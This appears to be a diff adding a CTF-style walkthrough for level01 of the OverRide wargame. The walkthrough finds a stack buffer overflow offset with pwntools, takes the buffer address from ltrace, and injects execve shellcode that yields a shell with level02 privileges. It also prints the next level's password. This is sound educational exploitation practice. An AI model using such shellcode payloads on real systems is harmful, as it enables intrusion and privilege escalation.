@@ -1,0 +1,69 @@
+from the source we can see that the second buffer is vulnerable
+so we can attempt an overflow
+
+
+>>> from pwn import *
+>>> g = cyclic_gen()
+>>> g.get(100) 
+b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+
+
+> gdb level01
+(gdb) r
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616175 in ?? ()
+
+0x61616175 -> uaaa
+
+>>> g.find(b'uaaa') 
+(80, 0, 80)
+
+so we have an offset of 80
+
+
+> ltrace ./level01
+__libc_start_main(0x80484d0, 1, -10300, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+)                               = 39
+printf("Enter Username: ")                                                = 16
+fgets(Enter Username: dat_wil
+"dat_wil\n", 256, 0xf7fcfac0)                                       = 0x0804a040
+puts("verifying username....\n"verifying username....
+
+)                                          = 24
+puts("Enter Password: "Enter Password:
+)                                                  = 17
+fgets(test
+"test\n", 100, 0xf7fcfac0)                                          = 0xffffd6dc
+puts("nope, incorrect password...\n"nope, incorrect password...
+
+)                                     = 29
++++ exited (status 1) +++
+
+
+now we know that the buffer is at 0xffffd6dc
+we can proceed with a script that will assemble the exploit
+
+then:
+level01@OverRide:~$ python -c "print(b'dat_wil\n1\xc0Ph//shh/bin\x89\xe3PS\x89\xe11\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdc\xd6\xff\xff')" > /tmp/exploit
+level01@OverRide:~$ cat /tmp/exploit - | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+id
+uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
